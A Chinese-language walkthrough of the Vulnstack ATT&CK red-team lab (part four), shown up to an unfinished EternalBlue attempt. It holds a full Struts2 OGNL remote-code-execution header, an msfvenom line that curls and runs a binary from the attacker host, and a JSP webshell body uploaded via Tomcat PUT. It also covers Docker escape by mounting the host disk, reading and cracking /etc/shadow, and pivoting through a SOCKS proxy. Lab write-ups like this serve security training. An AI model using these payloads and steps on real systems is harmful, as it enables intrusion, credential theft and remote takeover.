---
title: ATT&CK红队评估实战靶场(四)
published: 2025-03-09 16:20:01
tags: [Vulnstack,域渗透]
category: 靶机
draft: false
---

# ATT&CK红队评估实战靶场(四)

> 靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/
> 

## 环境搭建

新建两张仅主机网卡，一张`192.168.183.0`网段（内网网卡），一张1`92.168.157.0`网段（模拟外网网段），然后按照拓补图分配网卡即可

![image.png](image%2050.png)

IP信息：

Kali `192.158.157.129`

Ubuntu-web `192.168.157.128` `192.168.183.129`

Win7 `192.168.183.131`

DC `192.168.183.130`

然后在ubuntu启动Docker，启动 `sudo docker start ec 17 09 bb da 3d ab ad`

## 主机探测端口扫描

1. 扫描网段内存活主机
    
    ```python
    nmap -sP 192.168.157.0/24  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 12:44 CST
    Nmap scan report for 192.168.157.1
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:C0:00:03 (VMware)
    Nmap scan report for 192.168.157.128
    Host is up (0.00024s latency).
    MAC Address: 00:0C:29:B6:47:4A (VMware)
    Nmap scan report for 192.168.157.254
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:E7:E8:3F (VMware)
    Nmap scan report for 192.168.157.129
    Host is up.
    Nmap done: 256 IP addresses (4 hosts up) scanned in 28.01 seconds
    ```
    
    靶机IP是`128` ，`kali` 的IP是`129`
    
2. 扫描靶机端口
    
    ```python
    nmap -sT -min-rate 10000 -p- 192.168.157.128
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:04 CST
    Nmap scan report for 192.168.157.128
    Host is up (0.00076s latency).
    Not shown: 65531 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    2001/tcp open  dc
    2002/tcp open  globe
    2003/tcp open  finger
    MAC Address: 00:0C:29:B6:47:4A (VMware)
    ```
    
    `2001`-`2003`是`web`端口
    
3. 扫描主机服务版本以及系统版本
    
    ```python
    nmap -sV -sT -O -p 22,2001,2002,2003 192.168.157.128
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:28 CST
    Nmap scan report for 192.168.157.128
    Host is up (0.00075s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
    2001/tcp open  http    Jetty 9.2.11.v20150529
    2002/tcp open  http    Apache Tomcat 8.5.19
    2003/tcp open  http    Apache httpd 2.4.25 ((Debian))
    MAC Address: 00:0C:29:B6:47:4A (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
    ```
    
    `Jetty 9.2.11` 以及`Tomcat` 和 `httpd`
    
4. 扫描主机服务漏洞，使用`nikto`扫描
    
    ```python
    nikto -host 192.168.157.128 -port 22,2001,2002,2003                                                                                                                                 
    - Nikto v2.5.0                                                                                                                                                                          
    ---------------------------------------------------------------------------                                                                                                             
    ---------------------------------------------------------------------------                                                                                                             
    + Target IP:          192.168.157.128                                                                                                                                                   
    + Target Hostname:    192.168.157.128                                                                                                                                                   
    + Target Port:        2001                                                                                                                                                              
    + Start Time:         2024-12-02 13:51:23 (GMT8)                                                                                                                                        
    ---------------------------------------------------------------------------                                                                                                             
    + Server: Jetty(9.2.11.v20150529)                                                                                                                                                       
    + /: Cookie JSESSIONID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies                                                                
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options                                        
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparke
    r.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/                
    + No CGI Directories found (use '-C all' to force check all possible dirs)                                                                                                              
    + Jetty/9.2.11.v20150529 appears to be outdated (current is at least 11.0.6). Jetty 10.0.6 AND 9.4.41.v20210516 are also currently supported.                                           
    + /: Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42.                                                                                                              
    + /: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
    + /index.action: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
    + /login.action: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638                                            
    + /getaccess: This may be an indication that the server is running getAccess for SSO.                                                                                                   + /siteminder: This may be an indication that the server is running Siteminder for SSO.                                                                                                 
    + /tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.               
    + ERROR: Error limit (20) reached for host, giving up. Last error:                                                                                                                      
    + Scan terminated: 0 error(s) and 11 item(s) reported on remote host                                                                                                                    
    + End Time:           2024-12-02 13:51:37 (GMT8) (14 seconds)                                                                                                                           
    ---------------------------------------------------------------------------                                                                                                             
    + Target IP:          192.168.157.128                                                       
    + Target Hostname:    192.168.157.128                                                                                                                                                   
    + Target Port:        2002                                                                                                                                                              
    + Start Time:         2024-12-02 13:51:37 (GMT8)                                                                                                                                        
    ---------------------------------------------------------------------------                                                                                                             
    + Server: No banner retrieved                                                               
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparke
    r.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + No CGI Directories found (use '-C all' to force check all possible dirs)                                                                                                              
    + /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
    + /nikto-test-7haKDeBL.html: HTTP method 'PUT' allows clients to save files on the web server. See: https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled
    + /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon                    [0/122]
    + /nikto-test-7haKDeBL.html: HTTP method 'PUT' allows clients to save files on the web server. See: https://portswigger.net/kb/issues/00100900_http-put-method-is-enabled               
    + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .                                                                                                                
    + HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.                                                                                       
    + HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.                                                                                           
    + /examples/servlets/index.html: Apache Tomcat default JSP pages present.                                                                                                               
    + /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104                      
    + /manager/manager-howto.html: Tomcat documentation found. See: CWE-552                                                                                                                 
    + /manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                                 
    + /host-manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                            
    + /manager/status: Default Tomcat Server Status interface found.                                                                                                                        
    + /host-manager/status: Default Tomcat Server Status interface found.                                                                                                                   
    + 9610 requests: 0 error(s) and 14 item(s) reported on remote host                                                                                                                      
    + End Time:           2024-12-02 13:52:21 (GMT8) (44 seconds)                                                                                                                           
    ---------------------------------------------------------------------------                                                                                                             
    + Target IP:          192.168.157.128                                                                                                                                                   
    + Target Hostname:    192.168.157.128                                                       
    + Target Port:        2003                                                                                                                                                              
    + Start Time:         2024-12-02 13:52:21 (GMT8)                                                                                                                                        
    ---------------------------------------------------------------------------                                                                                                             
    + Server: Apache/2.4.25 (Debian)                                                                                                                                                        
    + /: Retrieved x-powered-by header: PHP/7.2.5.                                                                                                                                          
    + /: Uncommon header 'x-ob_mode' found, with contents: 1.                                                                                                                               
    + /TrzGOLfn.show_query_columns: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/                                                                                 
    + No CGI Directories found (use '-C all' to force check all possible dirs)                                                                                                              
    + Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.                                                                
    + Multiple index files found: /index.php, /index.jsp.                                                                                                                                   
    + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.                                                                                        
    + /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017    
    + /README: README file found.                                                               
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/                                                                     
    + /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      
    + /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      
    + /package.json: Node.js package file found. It may contain sensitive information.                                                                                                      
    + 17689 requests: 0 error(s) and 12 item(s) reported on remote host                         
    + End Time:           2024-12-02 13:53:18 (GMT8) (57 seconds)                                                                                                                           
    ---------------------------------------------------------------------------                                                                                                             
    + 3 host(s) tested                                    
    ```
    
    `2001`端口可能存在`CVE-2017-5638` ，`2002` 端口允许`put`和`delete`方法（可能存在`CVE-2017-12615`）
    

## web渗透

1. 访问主页
    - `2001`端口
        
        ![image.png](image%2051.png)
        
        文件上传页面
        
    - `2002`端口
        
        ![image.png](image%2052.png)
        
    - `2003`端口
        
        ![image.png](image%2053.png)
        
        竟然是`phpmyadmin`
        

### CVE-2017-5638

> https://www.cnblogs.com/moyudaxia/p/14445883.html
> 

发现和靶机页面一模一样，应该是使用直接`Docker`造的

- 验证漏洞
    
    ```c
    Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
    ```
    
    ![image.png](image%2054.png)
    
    漏洞存在
    
- EXP，存在命令执行
    
    ```c
    Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='RCE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    ```
    
1. 进行反弹`shell`
    - `msfvenom`生成`payload`
        
        ```c
        msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp lhost=192.168.157.129 lport=1234 -f raw                                                                         
        [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
        [-] No arch selected, selecting arch: cmd from the payload
        No encoder specified, outputting raw payload
        Payload size: 117 bytes
        curl -so /tmp/irZWQXXBy http://192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy &
        ```
        
    - `msf`监听
        
        ```c
        msf6 > use exploit/multi/handler                                                                 
        msf6 exploit(multi/handler) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp             
        msf6 exploit(multi/handler) > set lhost 192.168.157.129                                                                                                                                 
        msf6 exploit(multi/handler) > set lport 1234                                                     
        msf6 exploit(multi/handler) > run                                                                                                                                                       
        ```
        
    - `exp`中填入生成的`payload`，然后发送
        
        ```c
        Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl -so /tmp/irZWQXXBy http://192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy &').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        ```
        
    - 获得shell
        
        ```c
        msf6 exploit(multi/handler) > run                                                                                                                                                       
                                                                                                         
        [*] Started reverse TCP handler on 192.168.157.129:1234                              
        [*] Sending stage (3045380 bytes) to 192.168.157.128                                             
        [*] Meterpreter session 1 opened (192.168.157.129:1234 -> 192.168.157.128:52614) at 2024-12-02 14:52:14 +0800                                                                           
                                                                                                                                                                                                
        meterpreter >                                                                                                 
        ```
        

### CVE-2017-12615

`Tomcat PUT`方法任意写文件漏洞，利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限

1. 抓包然后修改为`PUT`方法，然后`1.jsp`是上传文件名，内容块里边是冰蝎的`JSP`脚本内容
    
    ```c
    PUT /1.jsp/ HTTP/1.1
    Host: 192.168.157.128:2002
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Referer: http://192.168.157.128:2001/
    Sec-GPC: 1
    Connection: keep-alive
    Cookie: JSESSIONID=ebkm5umq7o4emfo8amiifu8q; phpMyAdmin=0e02d819225d61988d3e5e0979e5bf09; pma_lang=zh_CN
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    ```
    
2. 使用冰蝎连接，成功连接，获得`shell`
    
    ![image.png](image%2055.png)
    
3. 然后通过上边一样的方法反弹`shell`即可

## 信息收集

1. 查看权限
    
    ```c
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # whoami
    root
    # uname -a
    Linux 174745108fcb 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux
    ```
    
    直接就是`root`权限？
    
2. 判断是否是`Docker`环境
    
    ```c
    meterpreter > run post/linux/gather/checkcontainer 
    
    [+] This appears to be a 'Docker' container
    ```
    
    似乎这是一个`Docker`容器，再看根目录下是否存在`.dockerenv`文件
    
    ```c
    cd /
    pwd
    /
    ls -al
    total 72
    drwxr-xr-x   1 root root 4096 Jan 22  2020 .
    drwxr-xr-x   1 root root 4096 Jan 22  2020 ..
    -rwxr-xr-x   1 root root    0 Jan 22  2020 .dockerenv
    ```
    
    由此可以判断是在容器内
    

## Docker逃逸

> https://xz.aliyun.com/t/8558?time__1311=n4%2BxnD0DcDuD90WY4GNepDUh2YDOl9YD02L%2BiD#toc-3
> 
1. 想着尝试用`dirty cow`来逃逸`Docker`，但是发现内核版本不在范围内，只能寻找别的方法
2. 然后尝试 **利用特权模式进行逃逸**
    
    > 当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。
    > 
    
    使用`fdisk -l`查看磁盘，无回显（现在是`2001`端口获得的`shell`）
    
    ```c
    # fdisk -l
    ```
    
    使用`tomcat`获得的`shell`来查看磁盘，可以查看到
    
    ```c
    # fdisk -l
    Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors
    Units: sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    Disklabel type: dos
    Disk identifier: 0x00063af9
    
    Device     Boot    Start      End  Sectors Size Id Type
    /dev/sda1  *        2048 16779263 16777216   8G 83 Linux
    /dev/sda2       16781310 20969471  4188162   2G  5 Extended
    /dev/sda5       16781312 20969471  4188160   2G 82 Linux swap / Solaris
    ```
    
    判断特权模式
    
    ```c
    cat /proc/self/status | grep CapEff
    ```
    
    特权模式启动的话，`CapEff`对应的掩码值应该为`0000003fffffffff`或者是 `0000001fffffffff`
    
    ![image.png](image%2056.png)
    
    创建目录，并将分区挂载到目录中
    
    ```c
    mkdir test
    mount /dev/sda1 /test
    ```
    
    然后已经将宿主机挂在到`test`目录下了
    
    ```c
    ls -al /test
    total 120
    drwxr-xr-x  23 root root  4096 Jan 20  2020 .
    drwxr-xr-x   1 root root  4096 Dec  3 05:20 ..
    drwxr-xr-x   2 root root  4096 Jan 20  2020 bin
    drwxr-xr-x   3 root root  4096 Jan 20  2020 boot
    drwxrwxr-x   2 root root  4096 Jan 20  2020 cdrom
    drwxr-xr-x   4 root root  4096 Mar  4  2019 dev
    drwxr-xr-x 130 root root 12288 Dec  3 04:57 etc
    drwxr-xr-x   3 root root  4096 Jan 20  2020 home
    lrwxrwxrwx   1 root root    33 Jan 20  2020 initrd.img -> boot/initrd.img-4.4.0-142-generic
    drwxr-xr-x  23 root root  4096 Jan 20  2020 lib
    drwxr-xr-x   2 root root  4096 Mar  4  2019 lib64
    drwx------   2 root root 16384 Jan 20  2020 lost+found
    drwxr-xr-x   3 root root  4096 Mar  4  2019 media
    drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
    drwxr-xr-x   2 root root  4096 Jan 20  2020 opt
    drwxr-xr-x   2 root root  4096 Apr 10  2014 proc
    drwx------   2 root root  4096 Jan 21  2020 root
    drwxr-xr-x  12 root root  4096 Mar  4  2019 run
    drwxr-xr-x   2 root root 12288 Jan 20  2020 sbin
    drwxr-xr-x   2 root root  4096 Mar  4  2019 srv
    drwxr-xr-x   2 root root  4096 Mar 13  2014 sys
    drwxrwxrwt   5 root root  4096 Dec  3 05:17 tmp
    drwxr-xr-x  10 root root  4096 Mar  4  2019 usr
    drwxr-xr-x  13 root root  4096 Mar  4  2019 var
    lrwxrwxrwx   1 root root    30 Jan 20  2020 vmlinuz -> boot/vmlinuz-4.4.0-142-generic
    ```
    
3. 查看`shadow`文件，仅能看到`ubuntu`用户有密码
    
    ```c
    cat /test/etc/shadow 
    ubuntu:$1$xJbww$Yknw8dsfh25t02/g2fM9g/:18281:0:99999:7:::
    ```
    
4. 拿到开膛手破解
    
    ```c
    john pass.txt                                        
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
    Use the "--format=md5crypt-long" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
    Will run 8 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    ubuntu           (ubuntu)     
    1g 0:00:00:00 DONE 1/3 (2024-12-03 13:24) 33.33g/s 6400p/s 6400c/s 6400C/s ubuntu..ubuntut
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
    ```
    
    破解出密码 `ubuntu`
    
5. 尝试登陆SSH
    
    ```c
    ssh ubuntu@192.168.157.128 
    ubuntu@192.168.157.128's password: 
    Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com/
    
    Your Hardware Enablement Stack (HWE) is supported until April 2019.
    Last login: Thu Jan 23 20:50:17 2020 from 192.168.157.128
    ubuntu@ubuntu:~$ 
    ```
    
    成功进入，查看IP信息等
    
    ```c
    ubuntu@ubuntu:~$ ip add  
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000                                                                                                             
        link/ether 00:0c:29:b6:47:4a brd ff:ff:ff:ff:ff:ff
        inet 192.168.157.128/24 brd 192.168.157.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:feb6:474a/64 scope link                                                                                                                                                                  
           valid_lft forever preferred_lft forever                                                           
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:b6:47:54 brd ff:ff:ff:ff:ff:ff
        inet 192.168.183.129/24 brd 192.168.183.255 scope global eth1                                                                                                                                                 
           valid_lft forever preferred_lft forever                                                           
        inet6 fe80::20c:29ff:feb6:4754/64 scope link  
           valid_lft forever preferred_lft forever
    ```
    
    可以发现逃逸了`docker`环境，并且内网网段是`192.168.183.0`
    

## 内网信息收集

1. 查看`ubuntu`用户权限
    
    ```c
    ubuntu@ubuntu:~$ sudo -i
    [sudo] password for ubuntu: 
    root@ubuntu:~# 
    ```
    
    直接到`root`用户了，成功拿到`web`主机的最高权限
    
2. 将其上线MSF（和上面的方法一样）
    
    ```c
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 192.168.157.129:4445 
    [*] Sending stage (3045380 bytes) to 192.168.157.128
    [*] Meterpreter session 2 opened (192.168.157.129:4445 -> 192.168.157.128:37052) at 2024-12-03 13:29:59 +0800
    
    meterpreter > 
    ```
    
3. 首先将设置通向内网的路由，然后设置代理（方便后面使用）
    
    添加路由
    
    ```c
    meterpreter > run post/multi/manage/autoroute 
    
    [*] Running module against 192.168.157.128
    [*] Searching for subnets to autoroute.
    [+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 172.19.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 172.20.0.0/255.255.0.0 from host's routing table.
    [+] Route added to subnet 192.168.157.0/255.255.255.0 from host's routing table.
    [+] Route added to subnet 192.168.183.0/255.255.255.0 from host's routing table.
    ```
    
    然后设置代理
    
    ```c
    meterpreter > bg
    [*] Backgrounding session 2
    msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
    msf6 auxiliary(server/socks_proxy) > set version 4a
    msf6 auxiliary(server/socks_proxy) > run
    [*] Auxiliary module running as background job 0.
    ```
    
    然后配置`chainproxy4`的配置文件
    
    ```c
    # vim /etc/proxychains4.conf  
    socks4  127.0.0.1       1080   
    ```
    
    测试一下，我们知道`web`主机内网地址是`192.168.183.129` ，使用`curl`成功回显
    
    ```c
    proxychains curl 192.168.183.129:2001                                                                
    [proxychains] config file found: /etc/proxychains4.conf                                                  
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                   
    [proxychains] DLL init: proxychains-ng 4.17                                                              
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.183.129:2001  ...  OK                      
    
    <html>                                              
    <head>                                              
       <title>Struts2 Showcase - Fileupload sample</title>                                                   
    </head>                                                                       
    ```
    
4. 使用`fscan`扫描内网信息
    - 将`fscan` 上传到`ubuntu`
    - 靶机运行`fscan`将结果保存到`1.txt`
        
        ```c
        ./fscan -h 192.168.183.1/24 > 1.txt
        ```
        
5. 扫描完毕后查看`1.txt`结果
    - 存活主机，除了`web`主机内网还有两台
        
        ```c
        (icmp) Target 192.168.183.129 is alive   
        (icmp) Target 192.168.183.130 is alive  
        (icmp) Target 192.168.183.131 is alive
        ```
        
    - 端口扫描
        
        ```c
        192.168.183.130:445 open
        192.168.183.130:139 open  
        192.168.183.130:135 open 
        192.168.183.130:88 open  
        
        192.168.183.131:445 open
        192.168.183.131:139 open
        192.168.183.131:135 open  
        
        192.168.183.129:22 open 
        ```
        
        `130`开启了`88`端口，是`kerberos`服务端口，可能是域控，并且都开启了`445`端口
        
    - vulscan
        
        ```c
        [*] NetInfo                                         
        [*]192.168.183.131                                  
           [->]TESTWIN7-PC
           [->]192.168.183.131                              
        [*] NetBios 192.168.183.1   WORKGROUP\DESKTOP-OO4DPSM 
        [*] NetInfo                                      
        [*]192.168.183.130                                  
           [->]WIN-ENS2VR5TR3N                              
           [->]192.168.183.130                              
        [*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1
        [+] MS17-010 192.168.183.131    (Windows 7 Enterprise 7601 Service Pack 1) 
        [+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)
        ```
        
        和上面猜测的一样，`130`是`DC`，域名是`demo.com` ,并且两台主机都扫描出了可能存在`MS17-010`
        

## 内网渗透

### MS17-010

1. 尝试`MS17-010` 
    - `TESTWIN7-PC` `192.168.183.131` (概率低的令人发指)，可能是代理问题
        
        ```c
        msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms17_010_eternalblue
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.183.131
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/meterpreter/bind_tcp
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set AutoRunScript post/windows/manage/migrate
        msf6 exploit(windows/smb/ms17_010_eternalblue) > run
        
        [*] 192.168.183.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
        [+] 192.168.183.131:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
        [*] 192.168.183.131:445   - Scanned 1 of 1 hosts (100% complete)
        [+] 192.168.183.131:445 - The target is vulnerable.                                                      
        [*] 192.168.183.131:445 - Connecting to target for exploitation.
        [+] 192.168.183.131:445 - Connection established for exploitation.
        [+] 192.168.183.131:445 - Target OS selected valid for OS indicated by SMB reply
        [*] 192.168.183.131:445 - CORE raw buffer dump (40 bytes)
        [*] 192.168.183.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
        [*] 192.168.183.131:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
        [*] 192.168.183.131:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
        [+] 192.168.183.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply
        [*] 192.168.183.131:445 - Trying exploit with 12 Groom Allocations.
        [*] 192.168.183.131:445 - Sending all but last fragment of exploit packet
        [*] 192.168.183.131:445 - Starting non-paged pool grooming                             
        [+] 192.168.183.131:445 - Sending SMBv2 buffers                                                          
        [+] 192.168.183.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
        [*] 192.168.183.131:445 - Sending final SMBv2 buffers。
        [*] 192.168.183.131:445 - Sending last fragment of exploit packet!
        [*] 192.168.183.131:445 - Receiving response from exploit packet
        [*] 192.168.183.131:445 - Sending last fragment of exploit packet!
        [*] 192.168.183.131:445 - Receiving response from exploit packet                                         
        [+] 192.168.183.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                     
        [*] 192.168.183.131:445 - Sending egg to corrupted connection.                                           
        [*] 192.168.183.131:445 - Triggering free of corrupted buffer.                                           
        [*] Started bind TCP handler against 192.168.183.131:6756                                        
        [-] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        [-] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        [-] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  
        [*] 192.168.183.131:445 - Connecting to target for exploitation.                                         
        [+] 192.168.183.131:445 - Connection established for exploitation.                                       
        [+] 192.168.183.131:445 - Target OS selected valid for OS indicated by SMB reply                         
        [*] 192.168.183.131:445 - CORE raw buffer dump (40 bytes)                                                
        [*] 192.168.183.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp  
        [*] 192.168.183.131:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic  
        [*] 192.168.183.131:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1          
        [+] 192.168.183.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply                 
        [*] 192.168.183.131:445 - Trying exploit with 17 Groom Allocations.                                      
        [*] 192.168.183.131:445 - Sending all but last fragment of exploit packet
        [*] 192.168.183.131:445 - Starting non-paged pool grooming                                               
        [+] 192.168.183.131:445 - Sending SMBv2 buffers     
